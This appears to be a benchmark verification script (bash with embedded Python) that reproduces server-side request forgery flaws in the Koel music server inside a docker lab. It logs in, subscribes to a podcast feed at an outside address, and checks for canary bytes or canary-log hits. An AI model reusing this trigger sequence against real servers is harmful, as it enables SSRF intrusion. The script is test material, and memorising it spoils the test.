#!/usr/bin/env bash
# verify.sh --seed|--residual
# seed     CVE-2026-47260: GET /play streams canary bytes (RUN_FLAG in body) on V0; V1 on_redirect blocks.
# residual CVE-2026-54491: getStreamableUrl OPTIONS follows 302 with no on_redirect; canary hit-log on V1.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
export PCB_FLAG="${PCB_FLAG:-$RUN_FLAG}"

SVC="koel-${VERSION}"
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]' || true)"
export PCB_TARGET_PORT="${PORT:-}"
[[ -n "$PORT" ]] || { echo "verify: no published port for $SVC:80" >&2; exit 20; }
BASE="http://127.0.0.1:${PORT}"

if [[ "$MODE" == "--residual" ]]; then
  docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" exec -T canary \
    sh -c ': > /hits.log' >/dev/null 2>&1 || { echo "verify: canary exec failed" >&2; exit 20; }
fi

"$PY" - "$BASE" "$MODE" "$RUN_FLAG" <<'PYEOF'
import json, sys, time, urllib.error, urllib.request

BASE, MODE, FLAG = sys.argv[1], sys.argv[2], sys.argv[3]
FEED = "http://13.135.91.10/feed.xml"
EMAIL, PW = "listener@pcb.test", "ListenerPass123"


def http(method, url, data=None, headers=None, timeout=90):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, str(e).encode()


tok = None
for _ in range(40):
    st, b = http(
        "POST", f"{BASE}/api/me",
        data=json.dumps({"email": EMAIL, "password": PW}).encode(),
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        timeout=15,
    )
    try:
        j = json.loads(b)
        if st == 200 and j.get("token"):
            tok = j
            break
    except Exception:
        pass
    time.sleep(3)
if not tok:
    print("verify: koel login never ready", file=sys.stderr)
    sys.exit(20)

api, audio = tok["token"], tok["audio-token"]
st, b = http(
    "POST", f"{BASE}/api/podcasts",
    data=json.dumps({"url": FEED}).encode(),
    headers={"Authorization": f"Bearer {api}", "Content-Type": "application/json",
             "Accept": "application/json"},
)
pid = None
try:
    pid = json.loads(b)["id"]
except (KeyError, ValueError, TypeError):
    st, b = http(
        "GET", f"{BASE}/api/podcasts",
        headers={"Authorization": f"Bearer {api}", "Accept": "application/json"},
    )
    try:
        items = json.loads(b)
        items = items.get("data", items) if isinstance(items, dict) else items
        pid = next((p["id"] for p in items if p.get("url") == FEED), None)
    except Exception:
        pid = None
if pid is None:
    print(f"verify: podcast subscribe failed status={st} body={b[:300]!r}", file=sys.stderr)
    sys.exit(20)

episode = None
for _ in range(20):
    st, b = http(
        "GET", f"{BASE}/api/podcasts/{pid}/episodes",
        headers={"Authorization": f"Bearer {api}", "Accept": "application/json"},
    )
    try:
        eps = json.loads(b)
        if isinstance(eps, dict):
            eps = eps.get("data") or eps.get("episodes") or []
        if eps:
            episode = eps[0]["id"]
            break
    except Exception:
        pass
    time.sleep(3)
if episode is None:
    print("verify: no episode from feed", file=sys.stderr)
    sys.exit(20)

st, body = http("GET", f"{BASE}/play/{episode}?api_token={audio}", timeout=120)
text = body.decode("utf-8", "replace") if isinstance(body, (bytes, bytearray)) else str(body)
print(f"verify: play_status={st} episode={episode} body_len={len(text)}")
if MODE == "--seed":
    # Seed effect = RUN_FLAG bytes in the /play body (full-read EpisodePlayable GET).
    snippet = text[:500].replace("\n", " ")
    print(snippet)
    sys.exit(0 if FLAG in text else 10)
sys.exit(0)
PYEOF
rc=$?
if [[ "$MODE" == "--seed" ]]; then
  exit "$rc"
fi
[[ "$rc" -eq 0 ]] || { echo "verify: residual trigger failed rc=$rc" >&2; exit 20; }
sleep 2
LOG="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" exec -T canary sh -c 'cat /hits.log' 2>&1)" || { echo "$LOG" >&2; exit 20; }
echo "${LOG:0:500}"
# Residual effect = canary received inbound OPTIONS/GET (blind SSRF; hit-log "<METHOD> <path>").
if [[ -n "${LOG//[$'\t\r\n ']/}" ]]; then exit 0; else exit 10; fi
